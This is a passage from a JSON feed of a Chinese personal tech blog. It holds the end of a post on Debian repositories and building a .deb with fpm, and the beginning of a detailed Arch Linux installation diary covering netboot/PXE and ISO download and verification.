class=\"note info\">\n<p>我个人的理解是， <code>repository</code>  是指仓库名，仓库中列举了该仓库有哪些软件包。而 <code>mirror list</code>  指明了从哪里下载这个仓库中的软件包（网络地址）？在清华的镜像中有这个仓库，而在中科大的镜像中也有这个仓库。镜像中仓库的内容随着官方仓库内容的更新而更新？<br>\n关于什么是镜像，请看这里:</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hc2t1YnVudHUuY29tL3F1ZXN0aW9ucy85MTMxODAvd2hhdC1hcmUtbWlycm9ycw==\">What are mirrors？</span></li>\n</ul>\n</div>\n<p>不同的仓库中的软件版本可能不同，需要通过 <code>apt policy</code>  来看软件包所属的仓库。</p>\n<h2 id=\"每行内容如何解读\"><a class=\"markdownIt-Anchor\" href=\"#每行内容如何解读\">#</a> 每行内容如何解读？</h2>\n<div class=\"note info\">\n<p>以下内容摘自 UC Berkeley System Admin Decal 原文</p>\n</div>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>deb http://mirrors/debian/ stretch-backports main contrib non-free</pre></td></tr></table></figure><blockquote>\n<p><code>deb</code>  is binary package source.  <code>deb-src</code>  indicates src packages.<br>\n <code>http://…</code>  describes the location<br>\n <code>stretch-backports</code>  means that this is for  <code>Jessie stretch</code>  and from a  <code>backport</code>  repository<br>\n <code>main</code>  means that the repo has packages licensed under  <code>Debian Free Software Guidelines (DFSG)</code> <br>\n <code>contrib</code>  repos have packages licensed under  <code>DSFG</code>  but require  <code>non-free dependencies</code> <br>\n <code>non-free</code>  repos have packages that do not comply with  <code>DSFG</code></p>\n</blockquote>\n<h1 id=\"手动安装包\"><a class=\"markdownIt-Anchor\" href=\"#手动安装包\">#</a> 手动安装包</h1>\n<p>包中通常含有 <code>Makefile</code>  文件，我们可以手动的进行安装。<br>\n步骤：</p>\n<ol>\n<li>安装所需的相关包，例如 <code>gcc</code>  等</li>\n<li><code>./configure</code></li>\n<li><code>make</code></li>\n<li><code>make install</code></li>\n</ol>\n<p>不便之处：卸载麻烦。</p>\n<h1 id=\"包结构\"><a class=\"markdownIt-Anchor\" href=\"#包结构\">#</a> 包结构</h1>\n<p>Debian 包通常具有如下几个目录和文件：</p>\n<ul>\n<li><code>control</code> ：涵盖包的元信息，例如包的大小、版本、依赖</li>\n<li><code>debian-binary</code></li>\n<li><code>etc</code> ：配置文件</li>\n<li><code>md5sums</code> ：文件有效性检验</li>\n<li><code>usr</code>\n<ul>\n<li><code>bin</code> ：可执行文件，要加到 <code>$PATH</code>  环境变量中</li>\n<li><code>share</code> ：文档，man page，本地化设置\n<ul>\n<li><code>doc</code> ：文档</li>\n<li><code>info</code> : info page</li>\n<li><code>locale</code> ：本地化设置</li>\n<li><code>man</code> ：man page</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"自己组包\"><a class=\"markdownIt-Anchor\" href=\"#自己组包\">#</a> 自己组包</h1>\n<h2 id=\"usr-目录下几个重要的目录\"><a class=\"markdownIt-Anchor\" href=\"#usr-目录下几个重要的目录\">#</a> /usr 目录下几个重要的目录</h2>\n<ul>\n<li><code>/usr/bin</code>  二进制可执行文件</li>\n<li><code>/usr/lib</code>  相关的库</li>\n<li><code>/usr/include</code>  头文件</li>\n<li><code>/usr/share</code>  文档等等</li>\n</ul>\n<h2 id=\"打包过程将hellopenguinc程序打包\"><a class=\"markdownIt-Anchor\" href=\"#打包过程将hellopenguinc程序打包\">#</a> 打包过程：将 <code>hellopenguin.c</code>  程序打包</h2>\n<h3 id=\"初始准备\"><a class=\"markdownIt-Anchor\" href=\"#初始准备\">#</a> 初始准备</h3>\n<ol>\n<li>编写 <code>hellopenguin.c</code>  程序</li>\n</ol>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello Penguin!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><ol start=\"2\">\n<li>编译 <code>hellopenguin.c</code>  程序，生成可执行文件 <code>hellopenguin</code></li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gcc hellopenguin.c <span class=\"token parameter variable\">-o</span> hellopenguin</pre></td></tr></table></figure><h3 id=\"打包环境准备\"><a class=\"markdownIt-Anchor\" href=\"#打包环境准备\">#</a> 打包环境准备</h3>\n<ol>\n<li>使用 <code>fpm</code>  工具 ( <code>Ruby Gem</code> )</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> ruby-dev</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>$ <span class=\"token function\">sudo</span> gem <span class=\"token function\">install</span> fpm</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>$ fpm <span class=\"token parameter variable\">-s</span> <span class=\"token function\">dir</span> <span class=\"token parameter variable\">-t</span> deb <span class=\"token parameter variable\">-n</span> <span class=\"token punctuation\">[</span>name here<span class=\"token punctuation\">]</span> <span class=\"token parameter variable\">-v</span> <span class=\"token punctuation\">[</span>version <span class=\"token comment\">#] -C [the directory with the /usr folder]</span></pre></td></tr></table></figure><div class=\"note info\">\n<p>如果 <code>gem</code>  安装 <code>fpm</code>  过慢的话，需要给 ruby 环境换源，命令如下（这里使用清华源）：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 添加镜像源并移除默认源</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>gem sources <span class=\"token parameter variable\">--add</span> https://mirrors.tuna.tsinghua.edu.cn/rubygems/ <span class=\"token parameter variable\">--remove</span> https://rubygems.org/</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 列出已有源</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>gem sources <span class=\"token parameter variable\">-l</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 应该只有镜像源一个</span></pre></td></tr></table></figure><p>或者在 <code>~/.gemrc</code>  中将 <code>https://mirrors.tuna.tsinghua.edu.cn/rubygems/</code>  加到 <code>sources</code>  字段。</p>\n</div>\n<ol start=\"3\">\n<li>查看 <code>fpm</code>  是否安装，输入 <code>fpm</code></li>\n</ol>\n<h3 id=\"创建包文件夹\"><a class=\"markdownIt-Anchor\" href=\"#创建包文件夹\">#</a> 创建包文件夹</h3>\n<ol>\n<li>创建目录 <code>packpenguin/usr/bin</code> ，将 <code>hellopenguin</code>  放进去</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span> <span class=\"token parameter variable\">-p</span> packpenguin/usr/bin</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">mv</span> hellopenguin packpenguin/usr/bin</pre></td></tr></table></figure><ol start=\"2\">\n<li>在 <code>packpenguin</code>  的父目录中，使用 <code>fpm</code>  进行打包，命令如下：</li>\n</ol>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>fpm <span class=\"token parameter variable\">-s</span> <span class=\"token function\">dir</span> <span class=\"token parameter variable\">-t</span> deb <span class=\"token parameter variable\">-n</span> hellopenguin <span class=\"token parameter variable\">-v</span> <span class=\"token number\">1.0</span>~ocf1 <span class=\"token parameter variable\">-C</span> packpenguin</pre></td></tr></table></figure><p>其中几个字段解释如下：</p>\n<ul>\n<li><code>-s</code> ：使用一个目录构建</li>\n<li><code>-t</code> ：生成 <code>deb</code>  包</li>\n<li><code>-n</code> ：输出包的名字叫 <code>hellopenguin</code></li>\n<li><code>-v</code> ：版本号为 <code>1.0~ocf1</code></li>\n<li><code>-C</code> : 由 <code>packpenguin</code>  目录生成</li>\n</ul>\n<ol start=\"3\">\n<li>安装我们组建的包: <code>sudo dpkg -i ./hellopenguin_1.0~ocf1_amd64.deb</code></li>\n<li>输入 <code>hellopenguin</code> ，运行 <code>hellopenguin</code> ，可以看到输出了 <code>Hello Penguin!</code></li>\n</ol>\n<div class=\"note info\">\n<p>要卸载我们安装的包，可以使用 <code>dpkg --remove hellopenguin</code>  命令。</p>\n</div>\n<h1 id=\"参考资料\"><a class=\"markdownIt-Anchor\" href=\"#参考资料\">#</a> 参考资料</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMVJNTlBSSE5vaDRhNUtXd1hZOGZCV0o0OW5CYWZ4Ym80Zy1PdlNaWjg1VjgvZWRpdCNzbGlkZT1pZC5nNTM2NGNlYzI4Y18wXzEx\">Packaging</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZWNhbC5vY2YuYmVya2VsZXkuZWR1L2FyY2hpdmVzLzIwMjItc3ByaW5nL2xhYnMvYTIvI2dyYWRpbmctbm90ZQ==\">Advanced Lab 2 - Packages and Packaging and Troubleshooting</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMVVKSE83Zlhvay02Uk43REFKNVNQVHFjQ1hpUlNSOGhwR1p4OU9RTW5NT1UvZWRpdCNzbGlkZT1pZC5w\">Distros, Packaging, and Compiling</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZWNhbC5vY2YuYmVya2VsZXkuZWR1L2FyY2hpdmVzLzIwMjItc3ByaW5nL2xhYnMvYjQvI3doYXQtaXMtYS1kaXN0cmlidXRpb24=\">Beginner Lab 4 - Debian, packages, compiling software</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2pvcmRhbnNpc3NlbC9mcG0vd2lraQ==\">FPM 文档</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90bGRyLnNoLw==\">TLDR 页面</span></li>\n</ul>\n",
            "tags": [
                "Linux",
                "操作系统",
                "notes",
                "Debian",
                "包管理"
            ]
        },
        {
            "id": "https://salvely.github.io/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/",
            "url": "https://salvely.github.io/blog/2023/10/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/Arch/%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/",
            "title": "Arch Linux安装实录&知识讲解&踩坑分析（超详细！）",
            "date_published": "2023-10-12T05:50:44.000Z",
            "content_html": "<div class=\"note danger\">\n<p>此坑还没填完，暂时只添加了安装部分（装完发现 Arch wiki 实在是已经写得很详细了），还有很多的知识还没有完全弄清楚和补充。<br>\n等我学习完 <code>计算机组成原理</code> ， <code>操作系统</code> 和 <code>计算机网络</code> 后会再来填坑。</p>\n</div>\n<div class=\"note info\">\n<p>本文安装过程基本按照 Arch Linux 安装文档，附带了额外的相关知识。其中可能伴有踩坑，但是也是一种经验啦！😄<br>\n如发现本文某些地方有误，请在评论区评论，我看到的话会改过来哒！</p>\n</div>\n<h1 id=\"写作起因\"><a class=\"markdownIt-Anchor\" href=\"#写作起因\">#</a> 写作起因</h1>\n<p>Arch Linux 的安装过程涉及较多的操作系统知识，而不仅仅是像 Ubuntu/Debian 那样提供 GUI 中的几个选项供你选择。此外，Arch Linux 的文档较为详细（Arch wiki 简直是棒极了！）。<br>\n因此，本教程不只是演示本人的安装 &amp; 踩坑过程，还附带许多的相关文档带读、踩坑原因分析等。</p>\n<h1 id=\"本文适合哪些人\"><a class=\"markdownIt-Anchor\" href=\"#本文适合哪些人\">#</a> 本文适合哪些人</h1>\n<ol>\n<li>热爱倒腾的</li>\n<li>不怕踩坑的</li>\n<li>想要通过 Arch Linux 安装过程递归学习其他知识的</li>\n</ol>\n<h1 id=\"对于其他同学\"><a class=\"markdownIt-Anchor\" href=\"#对于其他同学\">#</a> 对于其他同学</h1>\n<p>若您仅需要高效的安装 Arch Linux，而不希望看相关知识及其他无关的踩坑过程的，可以：</p>\n<ol>\n<li>参考其他博主的奶妈式教程</li>\n</ol>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81OTYyMjc1MjQ=\">Arch Linux 详细安装教程，萌新再也不怕了！「2023.09」</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcmNoLmljZWt5bGluLm9ubGluZS8=\">archlinux 简明指南 包含安装、配置、维护等，帮助新手快速上手</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcmNobGludXhzdHVkaW8uZ2l0aHViLmlvL0FyY2hMaW51eFR1dG9yaWFsLyMv\">Arch Linux 安装使用教程 - ArchTutorial - Arch Linux Studio</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ttaW5kaS9qaWZmeWJveC1hcmNobGludXgtdHV0b3JpYWw=\">Github 教程 1</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RzMTk5OTE5OTkvQXJjaExpbnV4LUluc3RhbGwtVHV0b3JpYWw=\">Github 教程 2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NzgwNzU1Mzg=\">2022 年 12 月最新安装 Archlinux 一次过的教程</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC81MTM4NTkyMzY=\">2022.5 archlinux 详细安装过程</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWl2bS5jbi9hcmNobGludXgtaW5zdGFsbGF0aW9uLWd1aWRlLXNpbXBsZQ==\">ArchLinux 安装指南（新手向）</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MzM5MjAwNzk=\">Archlinux 安装教程超详细（2021.11.15</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3JlYWQvY3YyMDc1MzA1Mi8=\">Arch Linux 完全安装教程 2023.10</span></li>\n</ul>\n<ol start=\"2\">\n<li>archinstall 工具</li>\n</ol>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW51eC5jbi9hcnRpY2xlLTE0NDQ0LTEuaHRtbA==\">用 archinstall 自动化脚本安装 Arch Linux</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FyY2hsaW51eC9hcmNoaW5zdGFsbA==\">archinstall github 链接</span></li>\n</ul>\n<ol start=\"3\">\n<li>一些图形化界面安装工具</li>\n</ol>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Nwb29reWtpZG1tL3plbl9pbnN0YWxsZXI=\">Zen installer</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FyY2gtbGludXgtZ3VpL2FsZy1yZWxlYXNlcw==\">archlinuxgui</span></li>\n</ul>\n<ol start=\"4\">\n<li>Netboot 网络安装</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rlbmd0ZW5nc25ha2UvQXJjaC1saW51eC1pbnN0YWxsLXR1dG9yaWFs\">Github 上提供的脚本（按照里面的命令一个个输入）</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvQ2F0ZWdvcnk6SW5zdGFsbGF0aW9uX3Byb2Nlc3M=\">其他安装方式</span></li>\n<li>要在一个 Ubuntu 虚拟机上安装 Arch 虚拟机（嵌套虚拟机），请看<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZWNhbC5vY2YuYmVya2VsZXkuZWR1L2FyY2hpdmVzLzIwMjItc3ByaW5nL2xhYnMvYTMv\">这里</span></li>\n</ol>\n<h1 id=\"前言\"><a class=\"markdownIt-Anchor\" href=\"#前言\">#</a> 前言</h1>\n<p>在使用 Arch 前看了 UCB System Admin Decal 的 Linux Pre-install and Install 一节，其中的实验是在 Ubuntu 虚拟机上安装 Arch。Arch 的安装涉及到自己进行分区，对系统进行加密和解密等，我觉得非常有趣，对于操作系统本身也是一个探索的过程。因此决定挑战自己跟着官方文档进行安装。<br>\n以前每次安装 Linux 虚拟机，包括 Ubuntu 和 Debian，都是跟着一些博主自己写的奶妈式手把手安装教程一步步的装。每次都能安装成功，但是总是感觉少了一些 <code>【探索的乐趣】</code> 😆。<br>\n今天我就要跟着 Arch Linux 的官方文档一步步装，感受一把极致的安装酸爽体验！</p>\n<details><summary>如果你也想体验自己安装 Arch，或者是想成为 Arch 开发者，下面内容可能对你有帮助：</summary><div>\n<ol>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvSW5zdGFsbGF0aW9uX2d1aWRlI0FjcXVpcmVfYW5faW5zdGFsbGF0aW9uX2ltYWdl\">Arch Linux 官方安装文档</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRsYWIuYXJjaGxpbnV4Lm9yZy9hcmNobGludXgvYXJjaGlzby8tL2lzc3Vlcw==\">Issue tracker</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9saXN0cy5hcmNobGludXgub3JnL21haWxtYW4zL2xpc3RzL2FyY2gtcmVsZW5nLmxpc3RzLmFyY2hsaW51eC5vcmcv\">Mailing List</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eGNuLm9yZy93aWtpLyVFNSVCOCVCOCVFOCVBNyU4MSVFOSU5NyVBRSVFOSVBMiU5OA==\">常见问题及解答</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eGNuLm9yZy93aWtpL0hlbHA6JUU5JTk4JTg1JUU4JUFGJUJC\">帮助</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eGNuLm9yZy93aWtpL1Byb2plY3Q6JUU1JTg1JUIzJUU0JUJBJThF\">贡献项目</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93aWtpLmFyY2hsaW51eGNuLm9yZy93aWtpL01hbl9wYWdl\">帮助手册</span></li>\n</ol>\n</div></details>\n<h1 id=\"过程简介\"><a class=\"markdownIt-Anchor\" href=\"#过程简介\">#</a> 过程简介</h1>\n<p>安装过程涉及到的步骤包含：</p>\n<ol>\n<li>UEFI 模式启动（或 BIOS，但是分区会不一样，需要注意）</li>\n<li>设置键盘模式</li>\n<li>检查网络连接</li>\n<li>更新系统时钟</li>\n<li>创建磁盘分区</li>\n<li>初始化分区中的文件系统（ <code>/</code>  文件系统可选是否加密）</li>\n<li>挂载文件系统</li>\n<li>利用 <code>pacstrap</code>  安装必要的包：linux 内核， <code>initrd</code> 、 <code>init system</code> 、 <code>pacman</code> \\、 <code>base</code>  等等</li>\n<li>利用 <code>genfstab</code>  生成 <code>/etc/fstab</code> （文件系统表）</li>\n<li><code>arch-chroot</code>  进入 <code>/mnt</code>  目录</li>\n<li>通过修改 <code>/etc/hostname</code>  修改主机名<details><summary>boot 启动原理</summary><div>\n<blockquote>\n<p>图源自 UCB System Admin Decal (<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMW9MdHNqc0VJc3ZDaE9JMzFfNVlZRmhJTGZ6R2x5eDdIazlEc0wxTnYtbWMvZWRpdD9wbGk9MSNzbGlkZT1pZC5nOWI0MTRkZGEwNF8wXzE1OA==\">https://docs.google.com/presentation/d/1oLtsjsEIsvChOI31_5YYFhILfzGlyx7Hk9DsL1Nv-mc/edit?pli=1#slide=id.g9b414dda04_0_158</span>)</p>\n</blockquote>\n</div></details>\n</li>\n</ol>\n<p><img data-src=\"boot.png\" alt=\"boot启动原理\"><br>\n +++</p>\n<h1 id=\"获取安装镜像后缀为iso\"><a class=\"markdownIt-Anchor\" href=\"#获取安装镜像后缀为iso\">#</a> 获取安装镜像（后缀为.iso）</h1>\n<p>看了一下下载界面，最顶部写了当前发行版的信息，下面是对于几种不同用户的安装方式以及校验和，最后是所有的 Arch 镜像源集合。</p>\n<h2 id=\"发行版信息\"><a class=\"markdownIt-Anchor\" href=\"#发行版信息\">#</a> 发行版信息</h2>\n<p>当前发布版本: 2023.09.01<br>\n 内核版本: 6.4.12<br>\nISO 镜像文件大小: 804.3 MB</p>\n<h2 id=\"几种下载方式\"><a class=\"markdownIt-Anchor\" href=\"#几种下载方式\">#</a> 几种下载方式</h2>\n<h3 id=\"对于已经是-arch-用户的人\"><a class=\"markdownIt-Anchor\" href=\"#对于已经是-arch-用户的人\">#</a> 对于已经是 Arch 用户的人</h3>\n<ol>\n<li>通过命令 <code>pacman -Syu</code>  更新</li>\n<li>通过<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcmNobGludXgub3JnL21pcnJvcmxpc3Qv\">这里</span>更新镜像源</li>\n</ol>\n<h3 id=\"种子链接下载官方推荐\"><a class=\"markdownIt-Anchor\" href=\"#种子链接下载官方推荐\">#</a> 种子链接下载（官方推荐）</h3>\n<p>对于这种资源，可以使用 <code>百度网盘</code> 或者 <code>迅雷</code> 下载（和下载电影相同），下载格式为.torrent，该种子链接需要上传到百度网盘 / 迅雷，然后将其中的 iso 镜像文件下载到本地目录中。</p>\n<h3 id=\"netboot\"><a class=\"markdownIt-Anchor\" href=\"#netboot\">#</a> Netboot</h3>\n<p>安装时需要联网，最新版本会自动推送，可用于在系统启动时即时下载最新的 Arch Linux 版本。</p>\n<blockquote>\n<p>Netboot 使用定制的  <code>iPXE</code>  版本。 实时系统的 Linux 内核、 <code>initramfs</code>  和  <code>squashfs 文件</code> 是从 Arch Linux 镜像下载的。 所有下载文件的完整性都使用 <code>加密签名</code> 进行验证。</p>\n</blockquote>\n<p>这其中有几个问题：</p>\n<ol>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pcHhlLm9yZy9zdGFydA==\">iPXE</span> 是啥？<strong>一种开源的网络启动固件</strong><br>\n其官方文档中的描述如下：\n<blockquote>\n<p>iPXE 是领先的开源网络引导固件。它提供了完整的 PXE 实现，并通过其他功能进行了增强，例如：</p>\n<ul>\n<li>通过 HTTP 从 Web 服务器启动</li>\n<li>从 iSCSI SAN 引导</li>\n<li>通过 FCoE 从光纤通道 SAN 启动</li>\n<li>从 AoE SAN 引导</li>\n<li>从无线网络引导</li>\n<li>从广域网引导</li>\n<li>从 Infiniband 网络引导</li>\n<li>使用脚本控制引导过程</li>\n</ul>\n</blockquote>\n</li>\n</ol>\n<p>由此可以看出，iPXE 是一种基于网络进行系统启动的固件。它的启动需要依附于计算机网络的各种协议。在 Arch Linux 文档中也指明，使用 Netboot 安装需要满足以下两点要求：</p>\n<ul>\n<li>具有 DHCP 自配置的网络</li>\n<li>能够运行系统的足够存储</li>\n</ul>\n<p>而它的具体实现是基于 <code>PXE</code>  协议。<br>\n基于递归学习的理念，我又查了查<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU5JUEyJTg0JUU1JTkwJUFGJUU1JThBJUE4JUU2JTg5JUE3JUU4JUExJThDJUU3JThFJUFGJUU1JUEyJTgzIw==\"> PXE</span>。。。<br>\n其基本概念如下：</p>\n<blockquote>\n<p>预启动执行环境（Preboot eXecution Environment，PXE，也被称为预执行环境）提供了一种使用网络接口（Network Interface）启动计算机的机制。这种机制让计算机的启动可以不依赖本地数据存储设备（如硬盘）或本地已安装的操作系统。<br>\nPXE 当初是作为 Intel 的有线管理体系的一部分，Intel 和 Systemsoft 于 1999 年 9 月 20 日公布其规格（版本 2.1）[1]。通过使用像网际协议（IP）、用户数据报协议（UDP）、动态主机设定协定（DHCP）、BOOTP、小型文件传输协议（TFTP）等几种网络协议和全局唯一标识符（GUID）、通用网络驱动接口（UNDI）、通用唯一识别码（UUID）的概念并通过对客户机（通过 PXE 自检的电脑）固件扩展预设的 API 来实现目的。<br>\nPXE 客户机（client）这个术语是指机器在 PXE 启动过程中的角色。</p>\n</blockquote>\n<p>其基本的运行机制是：</p>\n<blockquote>\n<p>客户机的固件（如网卡的 PXE 固件）通过 DHCP 协议找到可用的 PXE 启动服务器。在找到可用的 PXE 启动服务器后，固件会向合适的启动服务器询问网络启动程序（NBP，Network Boot Program）的路径，并且通过 TFTP 协议将网络启动程序下载到电脑的内存中，最后执行它 [2]。</p>\n</blockquote>\n<p>由 <code>PXE</code>  机制又衍生出了无盘系统，其利用网络服务器下载启动系统的镜像，而不是本地硬盘。 <code>PXE</code>  的协议规范在<span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTMxMTAyMDAzMTQxL2h0dHA6Ly9kb3dubG9hZC5pbnRlbC5jb20vZGVzaWduL2FyY2hpdmVzL3dmbS9kb3dubG9hZHMvcHhlc3BlYy5wZGY=\"> intel 的这篇文档中</span>可以查到。而 PXE 的两个实现，一个为 <code>iPXE</code> ，另一个则是 <code>gPXE</code> 。 <code>gPXE</code>  目前已经停止开发，取而代之的是 <code>iPXE</code> 。<br>\n对于 <code>iPXE</code>  和 <code>gPXE</code>  更详细的介绍，可以参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmhjbC5tb2UvYXJjaGl2ZXMvMjE3Nw==\">这篇博文</span></p>\n<ol start=\"2\">\n<li>\n<p><code>initramfs文件</code> 和 <code>squashfs文件</code> 做什么用？<br>\nTODO</p>\n</li>\n<li>\n<p>为什么 <code>Arch Linux</code>  在下载过程中需要使用加密签名对镜像完整性进行验证？<br>\nTODO</p>\n</li>\n</ol>\n<h3 id=\"vagrant-images-docker-images\"><a class=\"markdownIt-Anchor\" href=\"#vagrant-images-docker-images\">#</a> Vagrant images &amp; docker images</h3>\n<p>TODO</p>\n<h3 id=\"vm-image\"><a class=\"markdownIt-Anchor\" href=\"#vm-image\">#</a> VM image</h3>\n<p>archlinux 虚拟机可从<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRsYWIuYXJjaGxpbnV4Lm9yZy9hcmNobGludXgvYXJjaC1ib3hlcy8tL3BhY2thZ2Vz\">这里</span>下载，使用手册<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRsYWIuYXJjaGxpbnV4Lm9yZy9hcmNobGludXgvYXJjaC1ib3hlcw==\">在此</span>。</p>\n<h3 id=\"http-下载最常用\"><a class=\"markdownIt-Anchor\" href=\"#http-下载最常用\">#</a> HTTP 下载（最常用）</h3>\n<p>从后文中的镜像源中下载镜像。需要注意的是，我们需要保证下载的镜像的校验和，和同一目录 <code>sha256sums.txt</code>  及 <code>b2sums.txt</code>  文件中的校验和匹配。<br>\n下载签名： <code>sq wkd get pierre@archlinux.org -o release-key.pgp</code> <br>\n 验证： <code>sq verify --signer-file release-key.pgp --detached archlinux-2023.09.01-x86_64.iso.sig archlinux-2023.09.01-x86_64.iso</code></p>\n<div class=\"note info\">\n<p><code>sq</code>  命令需要使用 <code>scoop</code>  进行安装，如果是 windows 用户，会比较麻烦，详细解决办法见后文</p>\n</div>\n<h2 id=\"校验和\"><a class=\"markdownIt-Anchor\" href=\"#校验和\">#</a> 校验和</h2>\n<p>最新版本的校验和下载详见官网。在镜像源网站上也可以看到 <code>sha256sums.txt</code>  和 <code>b2sums.txt</code> <br>\n<img data-src=\"tsinghua_mirror.png\" alt=\"清华大学镜像站\">。下载镜像后我们需要利用它与我们下载到的镜像的校验和进行比对 (主要是用于比对，这两个文件可下载也可不下载，在镜像站上也能打开，只要我们下载到的镜像的校验和文件中版本对应的那行的校验和匹配就行了)。</p>\n<h2 id=\"方法一\"><a class=\"markdownIt-Anchor\" href=\"#方法一\">#</a> 方法一</h2>\n<ol>\n<li>在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9hcmNobGludXgub3JnL2Rvd25sb2FkLw==\"> Download 界面</span>选择推荐的 BitTorrent Download:<br>\n<img data-src=\"download.png\" alt=\"下载界面\"></li>\n<li>下载到本地电脑的 Downloads 文件夹中，其后缀名为 